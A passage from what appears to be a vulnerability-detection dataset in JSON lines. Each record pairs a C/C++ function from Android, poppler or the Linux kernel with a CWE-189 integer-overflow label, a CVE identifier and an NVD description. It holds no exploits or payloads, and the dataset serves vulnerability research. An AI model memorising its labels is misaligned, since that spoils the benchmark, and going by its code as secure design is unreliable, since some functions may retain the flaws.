unlooped 16-bit samples if ADPCM is enabled */\n /*lint -e{506} -e{774} groundwork for future version to support 8 & 16 bit */\n if (bitDepth == 8)\n {\n if (p->bitsPerSample == 8)\n            size = dataSize;\n else\n /*lint -e{704} use shift for performance */\n            size = dataSize >> 1;\n if (p->loopLength)\n            size++;\n }\n\n else\n {\n if (p->bitsPerSample == 16)\n            size = dataSize;\n else\n /*lint -e{703} use shift for performance */\n            size = dataSize << 1;\n if (p->loopLength)\n            size += 2;\n }\n\n /* for first pass, add size to wave pool size and return */\n if (pDLSData->pDLS == NULL)\n {\n        pDLSData->wavePoolSize += (EAS_U32) size;\n return EAS_SUCCESS;\n }\n\n /* allocate memory and read in the sample data */\n    pSample = pDLSData->pDLS->pDLSSamples + pDLSData->wavePoolOffset;\n    pDLSData->pDLS->pDLSSampleOffsets[waveIndex] = pDLSData->wavePoolOffset;\n    pDLSData->pDLS->pDLSSampleLen[waveIndex] = (EAS_U32) size;\n    pDLSData->wavePoolOffset += (EAS_U32) size;\n if (pDLSData->wavePoolOffset > pDLSData->wavePoolSize)\n {\n { /* dpp: EAS_ReportEx(_EAS_SEVERITY_ERROR, \"Wave pool exceeded allocation\\n\"); */ }\n return EAS_ERROR_SOUND_LIBRARY;\n }\n\n if ((result = Parse_data(pDLSData, dataPos, dataSize, p, pSample)) != EAS_SUCCESS)\n return result;\n\n return EAS_SUCCESS;\n}\n", "func_hash": 34491048108805138432896232910231949099, "file_name": "None", "file_hash": null, "cwe": ["CWE-189"], "cve": "CVE-2015-3836", "cve_desc": "The Parse_wave function in arm-wt-22k/lib_src/eas_mdls.c in the Sonivox DLS-to-EAS converter in Android before 5.1.1 LMY48I does not reject a negative value for a certain size field, which allows remote attackers to execute arbitrary code or cause a denial of service (buffer overflow) via crafted XMF data, aka internal bug 21132860.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2015-3836"}
{"idx": 165040, "project": "Android", "commit_id": "c82e31a7039a03dca7b37c65b7890ba5c1e18ced", "project_url": "None", "commit_url": "https://android.googlesource.com/platform/frameworks/av/+/c82e31a7039a03dca7b37c65b7890ba5c1e18ced", "commit_message": "None", "target": 0, "func": "status_t BnHDCP::onTransact(\n uint32_t code, const Parcel &data, Parcel *reply, uint32_t flags) {\n switch (code) {\n case HDCP_SET_OBSERVER:\n {\n            CHECK_INTERFACE(IHDCP, data, reply);\n\n            sp<IHDCPObserver> observer =\n                interface_cast<IHDCPObserver>(data.readStrongBinder());\n\n            reply->writeInt32(setObserver(observer));\n return OK;\n }\n\n case HDCP_INIT_ASYNC:\n {\n            CHECK_INTERFACE(IHDCP, data, reply);\n\n const char *host = data.readCString();\n unsigned port = data.readInt32();\n\n            reply->writeInt32(initAsync(host, port));\n return OK;\n }\n\n case HDCP_SHUTDOWN_ASYNC:\n {\n            CHECK_INTERFACE(IHDCP, data, reply);\n\n            reply->writeInt32(shutdownAsync());\n return OK;\n }\n\n case HDCP_GET_CAPS:\n {\n            CHECK_INTERFACE(IHDCP, data, reply);\n\n            reply->writeInt32(getCaps());\n return OK;\n }\n\n\n         case HDCP_ENCRYPT:\n         {\n             size_t size = data.readInt32();\n            size_t bufSize = 2 * size;\n \n            // watch out for overflow\n            void *inData = NULL;\n            if (bufSize > size) {\n                inData = malloc(bufSize);\n            }\n\n            if (inData == NULL) {\n                reply->writeInt32(ERROR_OUT_OF_RANGE);\n                return OK;\n            }\n\n             void *outData = (uint8_t *)inData + size;\n \n             data.read(inData, size);\n\n uint32_t streamCTR = data.readInt32();\n uint64_t inputCTR;\n status_t err = encrypt(inData, size, streamCTR, &inputCTR, outData);\n\n            reply->writeInt32(err);\n\n if (err == OK) {\n                reply->writeInt64(inputCTR);\n                reply->write(outData, size);\n }\n\n            free(inData);\n            inData = outData = NULL;\n\n return OK;\n }\n\n case HDCP_ENCRYPT_NATIVE:\n {\n            CHECK_INTERFACE(IHDCP, data, reply);\n\n            sp<GraphicBuffer> graphicBuffer = new GraphicBuffer();\n            data.read(*graphicBuffer);\n size_t offset = data.readInt32();\n size_t size = data.readInt32();\n uint32_t streamCTR = data.readInt32();\n void *outData = malloc(size);\n uint64_t inputCTR;\n\n status_t err = encryptNative(graphicBuffer, offset, size,\n                                         streamCTR, &inputCTR, outData);\n\n            reply->writeInt32(err);\n\n if (err == OK) {\n                reply->writeInt64(inputCTR);\n                reply->write(outData, size);\n }\n\n            free(outData);\n            outData = NULL;\n\n return OK;\n }\n\n\n         case HDCP_DECRYPT:\n         {\n             size_t size = data.readInt32();\n            size_t bufSize = 2 * size;\n \n            // watch out for overflow\n            void *inData = NULL;\n            if (bufSize > size) {\n                inData = malloc(bufSize);\n            }\n\n            if (inData == NULL) {\n                reply->writeInt32(ERROR_OUT_OF_RANGE);\n                return OK;\n            }\n\n             void *outData = (uint8_t *)inData + size;\n \n             data.read(inData, size);\n\n uint32_t streamCTR = data.readInt32();\n uint64_t inputCTR = data.readInt64();\n status_t err = decrypt(inData, size, streamCTR, inputCTR, outData);\n\n            reply->writeInt32(err);\n\n if (err == OK) {\n                reply->write(outData, size);\n }\n\n            free(inData);\n            inData = outData = NULL;\n\n return OK;\n }\n\n default:\n return BBinder::onTransact(code, data, reply, flags);\n }\n}\n", "func_hash": 45530985115847920593351830337901498242, "file_name": "None", "file_hash": null, "cwe": ["CWE-189"], "cve": "CVE-2015-3834", "cve_desc": "Multiple integer overflows in the BnHDCP::onTransact function in media/libmedia/IHDCP.cpp in libstagefright in Android before 5.1.1 LMY48I allow attackers to execute arbitrary code via a crafted application that uses HDCP encryption, leading to a heap-based buffer overflow, aka internal bug 20222489.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2015-3834"}
{"idx": 165042, "project": "Android", "commit_id": "5e751957ba692658b7f67eb03ae5ddb2cd3d970c", "project_url": "None", "commit_url": "https://android.googlesource.com/platform/frameworks/av/+/5e751957ba692658b7f67eb03ae5ddb2cd3d970c", "commit_message": "None", "target": 0, "func": "status_t ESDS::parseESDescriptor(size_t offset, size_t size) {\n if (size < 3) {\n return ERROR_MALFORMED;\n }\n\n    offset += 2; // skip ES_ID\n    size -= 2;\n\n unsigned streamDependenceFlag = mData[offset] & 0x80;\n unsigned URL_Flag = mData[offset] & 0x40;\n unsigned OCRstreamFlag = mData[offset] & 0x20;\n\n ++offset;\n\n     --size;\n \n     if (streamDependenceFlag) {\n        if (size < 2)\n            return ERROR_MALFORMED;\n         offset += 2;\n         size -= 2;\n     }\n\n if (URL_Flag) {\n if (offset >= size) {\n\n             return ERROR_MALFORMED;\n         }\n         unsigned URLlength = mData[offset];\n        if (URLlength >= size)\n            return ERROR_MALFORMED;\n         offset += URLlength + 1;\n         size -= URLlength + 1;\n     }\n \n     if (OCRstreamFlag) {\n        if (size < 2)\n            return ERROR_MALFORMED;\n         offset += 2;\n         size -= 2;\n \n if ((offset >= size || mData[offset] != kTag_DecoderConfigDescriptor)\n && offset - 2 < size\n && mData[offset - 2] == kTag_DecoderConfigDescriptor) {\n            offset -= 2;\n            size += 2;\n\n            ALOGW(\"Found malformed 'esds' atom, ignoring missing OCR_ES_Id.\");\n }\n }\n\n if (offset >= size) {\n return ERROR_MALFORMED;\n }\n\n uint8_t tag;\n size_t sub_offset, sub_size;\n status_t err = skipDescriptorHeader(\n            offset, size, &tag, &sub_offset, &sub_size);\n\n if (err != OK) {\n return err;\n }\n\n if (tag != kTag_DecoderConfigDescriptor) {\n return ERROR_MALFORMED;\n }\n\n    err = parseDecoderConfigDescriptor(sub_offset, sub_size);\n\n return err;\n}\n", "func_hash": 260744358754951363009475764927028188653, "file_name": "None", "file_hash": null, "cwe": ["CWE-189"], "cve": "CVE-2015-1539", "cve_desc": "Multiple integer underflows in the ESDS::parseESDescriptor function in ESDS.cpp in libstagefright in Android before 5.1.1 LMY48I allow remote attackers to execute arbitrary code via crafted ESDS atoms, aka internal bug 20139950, a related issue to CVE-2015-4493.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2015-1539"}
{"idx": 165043, "project": "Android", "commit_id": "d44e5bde18a41beda39d49189bef7f2ba7c8f3cb", "project_url": "None", "commit_url": "https://android.googlesource.com/platform/frameworks/base/+/d44e5bde18a41beda39d49189bef7f2ba7c8f3cb", "commit_message": "None", "target": 0, "func": "static jobject Bitmap_createFromParcel(JNIEnv* env, jobject, jobject parcel) {\n if (parcel == NULL) {\n SkDebugf(\"-------- unparcel parcel is NULL\\n\");\n return NULL;\n }\n\n    android::Parcel* p = android::parcelForJavaObject(env, parcel);\n\n const bool        isMutable = p->readInt32() != 0;\n const SkColorType colorType = (SkColorType)p->readInt32();\n const SkAlphaType alphaType = (SkAlphaType)p->readInt32();\n const int         width = p->readInt32();\n const int         height = p->readInt32();\n const int         rowBytes = p->readInt32();\n const int         density = p->readInt32();\n\n if (kN32_SkColorType != colorType &&\n            kRGB_565_SkColorType != colorType &&\n            kARGB_4444_SkColorType != colorType &&\n            kIndex_8_SkColorType != colorType &&\n            kAlpha_8_SkColorType != colorType) {\n SkDebugf(\"Bitmap_createFromParcel unknown colortype: %d\\n\", colorType);\n\n         return NULL;\n     }\n \n    SkAutoTDelete<SkBitmap> bitmap(new SkBitmap);\n \n    if (!bitmap->setInfo(SkImageInfo::Make(width, height, colorType, alphaType), rowBytes)) {\n        return NULL;\n    }\n \n     SkColorTable* ctable = NULL;\n     if (colorType == kIndex_8_SkColorType) {\n         int count = p->readInt32();\n        if (count < 0 || count > 256) {\n            // The data is corrupt, since SkColorTable enforces a value between 0 and 256,\n            // inclusive.\n            return NULL;\n        }\n         if (count > 0) {\n             size_t size = count * sizeof(SkPMColor);\n             const SkPMColor* src = (const SkPMColor*)p->readInplace(size);\n            if (src == NULL) {\n                return NULL;\n            }\n             ctable = new SkColorTable(src, count);\n         }\n     }\n \n    jbyteArray buffer = GraphicsJNI::allocateJavaPixelRef(env, bitmap.get(), ctable);\n     if (NULL == buffer) {\n         SkSafeUnref(ctable);\n         return NULL;\n     }\n \n SkSafeUnref(ctable);\n\n size_t size = bitmap->getSize();\n\n    android::Parcel::ReadableBlob blob;\n\n     android::status_t status = p->readBlob(size, &blob);\n     if (status) {\n         doThrowRE(env, \"Could not read bitmap from parcel blob.\");\n         return NULL;\n     }\n \n    bitmap->lockPixels();\n    memcpy(bitmap->getPixels(), blob.data(), size);\n    bitmap->unlockPixels();\n\n \n     blob.release();\n \n    return GraphicsJNI::createBitmap(env, bitmap.detach(), buffer,\n            getPremulBitmapCreateFlags(isMutable), NULL, NULL, density);\n }\n", "func_hash": 122930912420633735294014497673321033140, "file_name": "None", "file_hash": null, "cwe": ["CWE-189"], "cve": "CVE-2015-1536", "cve_desc": "Integer overflow in the Bitmap_createFromParcel function in core/jni/android/graphics/Bitmap.cpp in Android before 5.1.1 LMY48I allows attackers to cause a denial of service (system_server crash) or obtain sensitive system_server memory-content information via a crafted application that leverages improper unmarshalling of bitmaps, aka internal bug 19666945.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2015-1536"}
{"idx": 165556, "project": "Android", "commit_id": "e8c62fb484151f76ab88b1d5130f38de24ac8c14", "project_url": "None", "commit_url": "https://android.googlesource.com/platform/system/core/+/e8c62fb484151f76ab88b1d5130f38de24ac8c14", "commit_message": "None", "target": 0, "func": " native_handle_t* native_handle_create(int numFds, int numInts)\n {\n    if (numFds < 0 || numInts < 0 || numFds > kMaxNativeFds || numInts > kMaxNativeInts) {\n        return NULL;\n    }\n \n    size_t mallocSize = sizeof(native_handle_t) + (sizeof(int) * (numFds + numInts));\n    native_handle_t* h = malloc(mallocSize);\n     if (h) {\n         h->version = sizeof(native_handle_t);\n         h->numFds = numFds;\n        h->numInts = numInts;\n }\n return h;\n}\n", "func_hash": 145796647662086939942537126268276666048, "file_name": "None", "file_hash": null, "cwe": ["CWE-189"], "cve": "CVE-2015-1528", "cve_desc": "Integer overflow in the native_handle_create function in libcutils/native_handle.c in Android before 5.1.1 LMY48M allows attackers to obtain a different application's privileges or cause a denial of service (Binder heap memory corruption) via a crafted application, aka internal bug 19334482.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2015-1528"}
{"idx": 184261, "project": "poppler", "commit_id": "c839b706092583f6b12ed3cc634bf5af34b7a2bb", "project_url": "https://github.com/freedesktop/poppler", "commit_url": "https://cgit.freedesktop.org/poppler/poppler/commit/?id=c839b706", "commit_message": "[glib] Fix CVE-2009-3607", "target": 0, "func": "create_surface_from_thumbnail_data (guchar *data,\n\t\t\t\t    gint    width,\n\t\t\t\t    gint    height,\n \t\t\t\t    gint    rowstride)\n {\n   guchar *cairo_pixels;\n  gint cairo_stride;\n   cairo_surface_t *surface;\n   int j;\n \n  surface = cairo_image_surface_create (CAIRO_FORMAT_RGB24, width, height);\n  if (cairo_surface_status (surface))\n    return NULL;\n\n  cairo_pixels = cairo_image_surface_get_data (surface);\n  cairo_stride = cairo_image_surface_get_stride (surface);\n \n   for (j = height; j; j--) {\n     guchar *p = data;\n     guchar *q = cairo_pixels;\n     guchar *end = p + 3 * width;\n\n     while (p < end) {\n #if G_BYTE_ORDER == G_LITTLE_ENDIAN\n       q[0] = p[2];\n       q[1] = p[1];\n       q[2] = p[0];\n#else\n       q[1] = p[0];\n       q[2] = p[1];\n       q[3] = p[2];\n#endif\n      p += 3;\n      q += 4;\n     }\n \n     data += rowstride;\n    cairo_pixels += cairo_stride;\n   }\n \n   return surface;\n}\n", "func_hash": 117850736600721186299084927495782979465, "file_name": "poppler-page.cc", "file_hash": 187894592759936494919442607189068850104, "cwe": ["CWE-189"], "cve": "CVE-2009-3607", "cve_desc": "Integer overflow in the create_surface_from_thumbnail_data function in glib/poppler-page.cc in Poppler 0.x allows remote attackers to cause a denial of service (memory corruption) or possibly execute arbitrary code via a crafted PDF document that triggers a heap-based buffer overflow.  NOTE: some of these details are obtained from third party information.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2009-3607"}
{"idx": 184336, "project": "linux", "commit_id": "44afb3a04391a74309d16180d1e4f8386fdfa745", "project_url": "https://github.com/torvalds/linux", "commit_url": "https://github.com/torvalds/linux/commit/44afb3a04391a74309d16180d1e4f8386fdfa745", "commit_message": "drm/i915: fix integer overflow in i915_gem_do_execbuffer()\n\nOn 32-bit systems, a large args->num_cliprects from userspace via ioctl\nmay overflow the allocation size, leading to out-of-bounds access.\n\nThis vulnerability was introduced in commit 432e58ed (\"drm/i915: Avoid\nallocation for execbuffer object list\").\n\nSigned-off-by: Xi Wang <xi.wang@gmail.com>\nReviewed-by: Chris Wilson <chris@chris-wilson.co.uk>\nCc: stable@vger.kernel.org\nSigned-off-by: Daniel Vetter <daniel.vetter@ffwll.ch>", "target": 0, "func": "i915_gem_do_execbuffer(struct drm_device *dev, void *data,\n\t\t       struct drm_file *file,\n\t\t       struct drm_i915_gem_execbuffer2 *args,\n\t\t       struct drm_i915_gem_exec_object2 *exec)\n{\n\tdrm_i915_private_t *dev_priv = dev->dev_private;\n\tstruct list_head objects;\n\tstruct eb_objects *eb;\n\tstruct drm_i915_gem_object *batch_obj;\n\tstruct drm_clip_rect *cliprects = NULL;\n\tstruct intel_ring_buffer *ring;\n\tu32 exec_start, exec_len;\n\tu32 seqno;\n\tu32 mask;\n\tint ret, mode, i;\n\n\tif (!i915_gem_check_execbuffer(args)) {\n\t\tDRM_DEBUG(\"execbuf with invalid offset/length\\n\");\n\t\treturn -EINVAL;\n\t}\n\n\tret = validate_exec_list(exec, args->buffer_count);\n\tif (ret)\n\t\treturn ret;\n\n\tswitch (args->flags & I915_EXEC_RING_MASK) {\n\tcase I915_EXEC_DEFAULT:\n\tcase I915_EXEC_RENDER:\n\t\tring = &dev_priv->ring[RCS];\n\t\tbreak;\n\tcase I915_EXEC_BSD:\n\t\tif (!HAS_BSD(dev)) {\n\t\t\tDRM_DEBUG(\"execbuf with invalid ring (BSD)\\n\");\n\t\t\treturn -EINVAL;\n\t\t}\n\t\tring = &dev_priv->ring[VCS];\n\t\tbreak;\n\tcase I915_EXEC_BLT:\n\t\tif (!HAS_BLT(dev)) {\n\t\t\tDRM_DEBUG(\"execbuf with invalid ring (BLT)\\n\");\n\t\t\treturn -EINVAL;\n\t\t}\n\t\tring = &dev_priv->ring[BCS];\n\t\tbreak;\n\tdefault:\n\t\tDRM_DEBUG(\"execbuf with unknown ring: %d\\n\",\n\t\t\t  (int)(args->flags & I915_EXEC_RING_MASK));\n\t\treturn -EINVAL;\n\t}\n\n\tmode = args->flags & I915_EXEC_CONSTANTS_MASK;\n\tmask = I915_EXEC_CONSTANTS_MASK;\n\tswitch (mode) {\n\tcase I915_EXEC_CONSTANTS_REL_GENERAL:\n\tcase I915_EXEC_CONSTANTS_ABSOLUTE:\n\tcase I915_EXEC_CONSTANTS_REL_SURFACE:\n\t\tif (ring == &dev_priv->ring[RCS] &&\n\t\t    mode != dev_priv->relative_constants_mode) {\n\t\t\tif (INTEL_INFO(dev)->gen < 4)\n\t\t\t\treturn -EINVAL;\n\n\t\t\tif (INTEL_INFO(dev)->gen > 5 &&\n\t\t\t    mode == I915_EXEC_CONSTANTS_REL_SURFACE)\n\t\t\t\treturn -EINVAL;\n\n\t\t\t/* The HW changed the meaning on this bit on gen6 */\n\t\t\tif (INTEL_INFO(dev)->gen >= 6)\n\t\t\t\tmask &= ~I915_EXEC_CONSTANTS_REL_SURFACE;\n\t\t}\n\t\tbreak;\n\tdefault:\n\t\tDRM_DEBUG(\"execbuf with unknown constants: %d\\n\", mode);\n\t\treturn -EINVAL;\n\t}\n\n\tif (args->buffer_count < 1) {\n\t\tDRM_DEBUG(\"execbuf with %d buffers\\n\", args->buffer_count);\n\t\treturn -EINVAL;\n\t}\n\n\tif (args->num_cliprects != 0) {\n\t\tif (ring != &dev_priv->ring[RCS]) {\n\t\t\tDRM_DEBUG(\"clip rectangles are only valid with the render ring\\n\");\n \t\t\treturn -EINVAL;\n \t\t}\n \n\t\tif (args->num_cliprects > UINT_MAX / sizeof(*cliprects)) {\n\t\t\tDRM_DEBUG(\"execbuf with %u cliprects\\n\",\n\t\t\t\t  args->num_cliprects);\n\t\t\treturn -EINVAL;\n\t\t}\n \t\tcliprects = kmalloc(args->num_cliprects * sizeof(*cliprects),\n \t\t\t\t    GFP_KERNEL);\n \t\tif (cliprects == NULL) {\n\t\t\tret = -ENOMEM;\n\t\t\tgoto pre_mutex_err;\n\t\t}\n\n\t\tif (copy_from_user(cliprects,\n\t\t\t\t     (struct drm_clip_rect __user *)(uintptr_t)\n\t\t\t\t     args->cliprects_ptr,\n\t\t\t\t     sizeof(*cliprects)*args->num_cliprects)) {\n\t\t\tret = -EFAULT;\n\t\t\tgoto pre_mutex_err;\n\t\t}\n\t}\n\n\tret = i915_mutex_lock_interruptible(dev);\n\tif (ret)\n\t\tgoto pre_mutex_err;\n\n\tif (dev_priv->mm.suspended) {\n\t\tmutex_unlock(&dev->struct_mutex);\n\t\tret = -EBUSY;\n\t\tgoto pre_mutex_err;\n\t}\n\n\teb = eb_create(args->buffer_count);\n\tif (eb == NULL) {\n\t\tmutex_unlock(&dev->struct_mutex);\n\t\tret = -ENOMEM;\n\t\tgoto pre_mutex_err;\n\t}\n\n\t/* Look up object handles */\n\tINIT_LIST_HEAD(&objects);\n\tfor (i = 0; i < args->buffer_count; i++) {\n\t\tstruct drm_i915_gem_object *obj;\n\n\t\tobj = to_intel_bo(drm_gem_object_lookup(dev, file,\n\t\t\t\t\t\t\texec[i].handle));\n\t\tif (&obj->base == NULL) {\n\t\t\tDRM_DEBUG(\"Invalid object handle %d at index %d\\n\",\n\t\t\t\t   exec[i].handle, i);\n\t\t\t/* prevent error path from reading uninitialized data */\n\t\t\tret = -ENOENT;\n\t\t\tgoto err;\n\t\t}\n\n\t\tif (!list_empty(&obj->exec_list)) {\n\t\t\tDRM_DEBUG(\"Object %p [handle %d, index %d] appears more than once in object list\\n\",\n\t\t\t\t   obj, exec[i].handle, i);\n\t\t\tret = -EINVAL;\n\t\t\tgoto err;\n\t\t}\n\n\t\tlist_add_tail(&obj->exec_list, &objects);\n\t\tobj->exec_handle = exec[i].handle;\n\t\tobj->exec_entry = &exec[i];\n\t\teb_add_object(eb, obj);\n\t}\n\n\t/* take note of the batch buffer before we might reorder the lists */\n\tbatch_obj = list_entry(objects.prev,\n\t\t\t       struct drm_i915_gem_object,\n\t\t\t       exec_list);\n\n\t/* Move the objects en-masse into the GTT, evicting if necessary. */\n\tret = i915_gem_execbuffer_reserve(ring, file, &objects);\n\tif (ret)\n\t\tgoto err;\n\n\t/* The objects are in their final locations, apply the relocations. */\n\tret = i915_gem_execbuffer_relocate(dev, eb, &objects);\n\tif (ret) {\n\t\tif (ret == -EFAULT) {\n\t\t\tret = i915_gem_execbuffer_relocate_slow(dev, file, ring,\n\t\t\t\t\t\t\t\t&objects, eb,\n\t\t\t\t\t\t\t\texec,\n\t\t\t\t\t\t\t\targs->buffer_count);\n\t\t\tBUG_ON(!mutex_is_locked(&dev->struct_mutex));\n\t\t}\n\t\tif (ret)\n\t\t\tgoto err;\n\t}\n\n\t/* Set the pending read domains for the batch buffer to COMMAND */\n\tif (batch_obj->base.pending_write_domain) {\n\t\tDRM_DEBUG(\"Attempting to use self-modifying batch buffer\\n\");\n\t\tret = -EINVAL;\n\t\tgoto err;\n\t}\n\tbatch_obj->base.pending_read_domains |= I915_GEM_DOMAIN_COMMAND;\n\n\tret = i915_gem_execbuffer_move_to_gpu(ring, &objects);\n\tif (ret)\n\t\tgoto err;\n\n\tseqno = i915_gem_next_request_seqno(ring);\n\tfor (i = 0; i < ARRAY_SIZE(ring->sync_seqno); i++) {\n\t\tif (seqno < ring->sync_seqno[i]) {\n\t\t\t/* The GPU can not handle its semaphore value wrapping,\n\t\t\t * so every billion or so execbuffers, we need to stall\n\t\t\t * the GPU in order to reset the counters.\n\t\t\t */\n\t\t\tret = i915_gpu_idle(dev, true);\n\t\t\tif (ret)\n\t\t\t\tgoto err;\n\n\t\t\tBUG_ON(ring->sync_seqno[i]);\n\t\t}\n\t}\n\n\tif (ring == &dev_priv->ring[RCS] &&\n\t    mode != dev_priv->relative_constants_mode) {\n\t\tret = intel_ring_begin(ring, 4);\n\t\tif (ret)\n\t\t\t\tgoto err;\n\n\t\tintel_ring_emit(ring, MI_NOOP);\n\t\tintel_ring_emit(ring, MI_LOAD_REGISTER_IMM(1));\n\t\tintel_ring_emit(ring, INSTPM);\n\t\tintel_ring_emit(ring, mask << 16 | mode);\n\t\tintel_ring_advance(ring);\n\n\t\tdev_priv->relative_constants_mode = mode;\n\t}\n\n\tif (args->flags & I915_EXEC_GEN7_SOL_RESET) {\n\t\tret = i915_reset_gen7_sol_offsets(dev, ring);\n\t\tif (ret)\n\t\t\tgoto err;\n\t}\n\n\ttrace_i915_gem_ring_dispatch(ring, seqno);\n\n\texec_start = batch_obj->gtt_offset + args->batch_start_offset;\n\texec_len = args->batch_len;\n\tif (cliprects) {\n\t\tfor (i = 0; i < args->num_cliprects; i++) {\n\t\t\tret = i915_emit_box(dev, &cliprects[i],\n\t\t\t\t\t    args->DR1, args->DR4);\n\t\t\tif (ret)\n\t\t\t\tgoto err;\n\n\t\t\tret = ring->dispatch_execbuffer(ring,\n\t\t\t\t\t\t\texec_start, exec_len);\n\t\t\tif (ret)\n\t\t\t\tgoto err;\n\t\t}\n\t} else {\n\t\tret = ring->dispatch_execbuffer(ring, exec_start, exec_len);\n\t\tif (ret)\n\t\t\tgoto err;\n\t}\n\n\ti915_gem_execbuffer_move_to_active(&objects, ring, seqno);\n\ti915_gem_execbuffer_retire_commands(dev, file, ring);\n\nerr:\n\teb_destroy(eb);\n\twhile (!list_empty(&objects)) {\n\t\tstruct drm_i915_gem_object *obj;\n\n\t\tobj = list_first_entry(&objects,\n\t\t\t\t       struct drm_i915_gem_object,\n\t\t\t\t       exec_list);\n\t\tlist_del_init(&obj->exec_list);\n\t\tdrm_gem_object_unreference(&obj->base);\n\t}\n\n\tmutex_unlock(&dev->struct_mutex);\n\npre_mutex_err:\n\tkfree(cliprects);\n\treturn ret;\n}\n", "func_hash": 331658217081478298945109689650940612129, "file_name": "i915_gem_execbuffer.c", "file_hash": 259959757549234845087885974252862936419, "cwe": ["CWE-189"], "cve": "CVE-2012-2384", "cve_desc": "Integer overflow in the i915_gem_do_execbuffer function in drivers/gpu/drm/i915/i915_gem_execbuffer.c in the Direct Rendering Manager (DRM) subsystem in the Linux kernel before 3.3.5 on 32-bit platforms allows local users to cause a denial of service (out-of-bounds write) or possibly have unspecified other impact via a crafted ioctl call.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2012-2384"}
{"idx": 184357, "project": "linux", "commit_id": "9438fabb73eb48055b58b89fc51e0bc4db22fabd", "project_url": "https://github.com/torvalds/linux", "commit_url": "https://github.com/torvalds/linux/commit/9438fabb73eb48055b58b89fc51e0bc4db22fabd", "commit_message": "cifs: fix possible memory corruption in CIFSFindNext\n\nThe name_len variable in CIFSFindNext is a signed int that gets set to\nthe resume_name_len in the cifs_search_info. The resume_name_len however\nis unsigned and for some infolevels is populated directly from a 32 bit\nvalue sent by the server.\n\nIf the server sends a very large value for this, then that value could\nlook negative when converted to a signed int. That would make that\nvalue pass the PATH_MAX check later in CIFSFindNext. The name_len would\nthen be used as a length value for a memcpy. It would then be treated\nas unsigned again, and the memcpy scribbles over a ton of memory.\n\nFix this by making the name_len an unsigned value in CIFSFindNext.\n\nCc: <stable@kernel.org>\nReported-by: Darren Lavender <dcl@hppine99.gbr.hp.com>\nSigned-off-by: Jeff Layton <jlayton@redhat.com>\nSigned-off-by: Steve French <sfrench@us.ibm.com>", "target": 0, "func": "int CIFSFindNext(const int xid, struct cifs_tcon *tcon,\n\t\t __u16 searchHandle, struct cifs_search_info *psrch_inf)\n{\n\tTRANSACTION2_FNEXT_REQ *pSMB = NULL;\n\tTRANSACTION2_FNEXT_RSP *pSMBr = NULL;\n \tT2_FNEXT_RSP_PARMS *parms;\n \tchar *response_data;\n \tint rc = 0;\n\tint bytes_returned;\n\tunsigned int name_len;\n \t__u16 params, byte_count;\n \n \tcFYI(1, \"In FindNext\");\n\n\tif (psrch_inf->endOfSearch)\n\t\treturn -ENOENT;\n\n\trc = smb_init(SMB_COM_TRANSACTION2, 15, tcon, (void **) &pSMB,\n\t\t(void **) &pSMBr);\n\tif (rc)\n\t\treturn rc;\n\n\tparams = 14; /* includes 2 bytes of null string, converted to LE below*/\n\tbyte_count = 0;\n\tpSMB->TotalDataCount = 0;       /* no EAs */\n\tpSMB->MaxParameterCount = cpu_to_le16(8);\n\tpSMB->MaxDataCount =\n\t\tcpu_to_le16((tcon->ses->server->maxBuf - MAX_CIFS_HDR_SIZE) &\n\t\t\t\t0xFFFFFF00);\n\tpSMB->MaxSetupCount = 0;\n\tpSMB->Reserved = 0;\n\tpSMB->Flags = 0;\n\tpSMB->Timeout = 0;\n\tpSMB->Reserved2 = 0;\n\tpSMB->ParameterOffset =  cpu_to_le16(\n\t      offsetof(struct smb_com_transaction2_fnext_req,SearchHandle) - 4);\n\tpSMB->DataCount = 0;\n\tpSMB->DataOffset = 0;\n\tpSMB->SetupCount = 1;\n\tpSMB->Reserved3 = 0;\n\tpSMB->SubCommand = cpu_to_le16(TRANS2_FIND_NEXT);\n\tpSMB->SearchHandle = searchHandle;      /* always kept as le */\n\tpSMB->SearchCount =\n\t\tcpu_to_le16(CIFSMaxBufSize / sizeof(FILE_UNIX_INFO));\n\tpSMB->InformationLevel = cpu_to_le16(psrch_inf->info_level);\n\tpSMB->ResumeKey = psrch_inf->resume_key;\n\tpSMB->SearchFlags =\n\t      cpu_to_le16(CIFS_SEARCH_CLOSE_AT_END | CIFS_SEARCH_RETURN_RESUME);\n\n\tname_len = psrch_inf->resume_name_len;\n\tparams += name_len;\n\tif (name_len < PATH_MAX) {\n\t\tmemcpy(pSMB->ResumeFileName, psrch_inf->presume_name, name_len);\n\t\tbyte_count += name_len;\n\t\t/* 14 byte parm len above enough for 2 byte null terminator */\n\t\tpSMB->ResumeFileName[name_len] = 0;\n\t\tpSMB->ResumeFileName[name_len+1] = 0;\n\t} else {\n\t\trc = -EINVAL;\n\t\tgoto FNext2_err_exit;\n\t}\n\tbyte_count = params + 1 /* pad */ ;\n\tpSMB->TotalParameterCount = cpu_to_le16(params);\n\tpSMB->ParameterCount = pSMB->TotalParameterCount;\n\tinc_rfc1001_len(pSMB, byte_count);\n\tpSMB->ByteCount = cpu_to_le16(byte_count);\n\n\trc = SendReceive(xid, tcon->ses, (struct smb_hdr *) pSMB,\n\t\t\t(struct smb_hdr *) pSMBr, &bytes_returned, 0);\n\tcifs_stats_inc(&tcon->num_fnext);\n\tif (rc) {\n\t\tif (rc == -EBADF) {\n\t\t\tpsrch_inf->endOfSearch = true;\n\t\t\tcifs_buf_release(pSMB);\n\t\t\trc = 0; /* search probably was closed at end of search*/\n\t\t} else\n\t\t\tcFYI(1, \"FindNext returned = %d\", rc);\n\t} else {                /* decode response */\n\t\trc = validate_t2((struct smb_t2_rsp *)pSMBr);\n\n\t\tif (rc == 0) {\n\t\t\tunsigned int lnoff;\n\n\t\t\t/* BB fixme add lock for file (srch_info) struct here */\n\t\t\tif (pSMBr->hdr.Flags2 & SMBFLG2_UNICODE)\n\t\t\t\tpsrch_inf->unicode = true;\n\t\t\telse\n\t\t\t\tpsrch_inf->unicode = false;\n\t\t\tresponse_data = (char *) &pSMBr->hdr.Protocol +\n\t\t\t       le16_to_cpu(pSMBr->t2.ParameterOffset);\n\t\t\tparms = (T2_FNEXT_RSP_PARMS *)response_data;\n\t\t\tresponse_data = (char *)&pSMBr->hdr.Protocol +\n\t\t\t\tle16_to_cpu(pSMBr->t2.DataOffset);\n\t\t\tif 